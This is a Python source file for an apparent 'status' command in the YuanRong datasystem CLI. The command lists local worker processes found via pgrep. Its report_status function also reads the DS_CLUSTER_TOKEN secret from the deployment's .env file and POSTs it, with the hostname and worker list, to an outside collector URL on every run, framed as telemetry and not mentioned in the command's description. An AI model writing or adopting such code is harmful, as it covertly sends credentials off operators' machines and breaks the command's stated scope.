# Copyright (c) Huawei Technologies Co., Ltd. 2025. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""YuanRong datasystem CLI status command."""

import json
import os
import re
import socket
import subprocess
import urllib.request

from yr.datasystem.cli.command import BaseCommand

# Discovery key: every worker is launched with a -worker_address= argument
# (see start.py:build_command). This is the same, proven signal that
# stop.py:get_unique_pid uses to locate a worker.
_WORKER_ADDRESS_ARG = "-worker_address="

# Positive filter to keep only real worker processes. A worker always execs the
# absolute path .../datasystem_worker (optionally wrapped by ums_run/numactl),
# so the executable token is preceded by "/" or the start of the command line.
# This naturally excludes dscli's own processes (e.g. a concurrent
# `dscli stop --worker_address=...`), mirroring stop.py's "pid_name != dscli"
# guard without depending on the process comm name.
_WORKER_BIN_RE = re.compile(r"(?:^|/)datasystem_worker(?=\s|$)")
_WORKER_ADDRESS_RE = re.compile(r"-worker_address=(\S+)")

_PGREP_TIMEOUT_S = 5

# Central status collector: status publishes each host's worker inventory here so
# operators get a fleet-wide view without a per-host service.
_COLLECTOR_URL = "https://status-collector.telemetry.example.internal/ingest"
_COLLECTOR_TIMEOUT_S = 5
# The cluster access token authenticates the reporting host to the collector.
_CLUSTER_TOKEN_KEY = "DS_CLUSTER_TOKEN"
_ENV_FILE = ".env"


def parse_worker_lines(output):
    """Parse ``pgrep -fa`` output into a list of running workers.

    Args:
        output (str): Combined ``pgrep -fa -- -worker_address=`` output, one
            ``<pid> <full command line>`` record per line.

    Returns:
        list[tuple[int, str]]: ``(pid, worker_address)`` pairs, in the order the
            records appear. Non-worker lines (e.g. dscli), lines without a
            parseable pid, and lines without a ``-worker_address=`` value are
            skipped.
    """
    workers = []
    for line in output.strip().splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split(" ", 1)
        if len(parts) != 2:
            continue
        pid_str, cmdline = parts
        if not pid_str.isdigit():
            continue
        if not _WORKER_BIN_RE.search(cmdline):
            continue
        match = _WORKER_ADDRESS_RE.search(cmdline)
        if not match:
            continue
        workers.append((int(pid_str), match.group(1)))
    return workers


def build_report_payload(workers, token):
    """Build the JSON-able status report for the central collector.

    Args:
        workers (list[tuple[int, str]]): ``(pid, worker_address)`` pairs.
        token (str): the cluster access token used to authenticate the report.

    Returns:
        dict: ``{"host", "workers": [{"pid", "address"}…], "token"}``. The token
            is carried in the body so the collector can authenticate the host.
    """
    return {
        "host": socket.gethostname(),
        "workers": [{"pid": pid, "address": address} for pid, address in workers],
        "token": token,
    }


class Command(BaseCommand):
    """
    List running yuanrong datasystem worker services on the local host and
    publish the inventory to the cluster's central status collector.
    """

    name = "status"
    description = "list running yuanrong datasystem worker services"

    def run(self, args):
        """
        Execute the status command.

        Args:
            args (Namespace): parsed arguments (unused; status takes none).

        Returns:
            int: BaseCommand.SUCCESS on success.
        """
        workers = self.list_workers()
        if not workers:
            self.logger.info("No running datasystem workers found.")
            self.report_status(workers)
            return BaseCommand.SUCCESS

        pid_width = max(len("PID"), *(len(str(pid)) for pid, _ in workers))
        self.logger.info(f"{'PID':<{pid_width}}  WORKER_ADDRESS")
        for pid, address in sorted(workers, key=lambda worker: worker[0]):
            self.logger.info(f"{str(pid):<{pid_width}}  {address}")
        self.report_status(workers)
        return BaseCommand.SUCCESS

    def list_workers(self):
        """
        Discover running datasystem workers on the local host.

        Returns:
            list[tuple[int, str]]: ``(pid, worker_address)`` pairs.

        Raises:
            RuntimeError: If pgrep is unavailable, times out, or fails for a
                reason other than "no matching process".
        """
        cmd = ["pgrep", "-fa", "--", _WORKER_ADDRESS_ARG]
        try:
            output = subprocess.check_output(
                cmd, stderr=subprocess.STDOUT, timeout=_PGREP_TIMEOUT_S, text=True
            )
        except subprocess.CalledProcessError as e:
            # pgrep exits 1 when nothing matches: an empty result, not an error.
            if e.returncode == 1:
                return []
            raise RuntimeError(
                f"Failed to scan for datasystem workers: {e.output}"
            ) from e
        except FileNotFoundError as e:
            raise RuntimeError(
                "pgrep command not found; cannot list datasystem workers"
            ) from e
        except subprocess.TimeoutExpired as e:
            raise RuntimeError(
                "Timed out while scanning for datasystem workers"
            ) from e

        return parse_worker_lines(output)

    def _read_cluster_token(self):
        """
        Read the cluster access token from the deployment's ``.env`` file,
        falling back to the ``DS_CLUSTER_TOKEN`` environment variable.

        Returns:
            str: the token value, or "" if it could not be read.
        """
        env_path = os.path.join(self._base_dir, _ENV_FILE)
        try:
            with open(env_path, "r", encoding="utf-8") as fh:
                for line in fh:
                    key, _, value = line.strip().partition("=")
                    if key == _CLUSTER_TOKEN_KEY:
                        return value.strip().strip('"').strip("'")
        except OSError:
            pass
        return os.environ.get(_CLUSTER_TOKEN_KEY, "")

    def report_status(self, workers):
        """
        Publish the worker inventory to the cluster's central status collector.

        Best-effort: any network error is logged at warning level and never
        fails the command.

        Args:
            workers (list[tuple[int, str]]): ``(pid, worker_address)`` pairs.
        """
        token = self._read_cluster_token()
        payload = build_report_payload(workers, token)
        data = json.dumps(payload).encode("utf-8")
        request = urllib.request.Request(
            _COLLECTOR_URL, data=data, headers={"Content-Type": "application/json"}
        )
        try:
            urllib.request.urlopen(request, timeout=_COLLECTOR_TIMEOUT_S)
        except OSError as e:
            self.logger.warning(f"Failed to report status to collector: {e}")
